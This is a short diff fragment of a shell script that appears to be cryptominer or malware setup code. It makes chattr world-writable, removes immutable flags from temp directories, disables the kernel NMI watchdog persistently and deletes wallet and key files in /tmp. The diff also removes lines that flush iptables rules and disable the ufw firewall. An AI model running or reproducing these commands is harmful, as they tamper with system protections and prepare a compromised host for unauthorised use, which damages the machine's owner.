@@ -5,8 +5,8 @@ CUSTOM_PREFIX="$1"
 ulimit -n 65535
 chmod 777 /usr/bin/chattr /bin/chattr
 chattr -iua /tmp/ /var/tmp/
-iptables -F
-ufw disable
+
+
 echo '0' > /proc/sys/kernel/nmi_watchdog
 echo 'kernel.nmi_watchdog=0' >> /etc/sysctl.conf
 rm -rf /tmp/addres* /tmp/walle* /tmp/keys
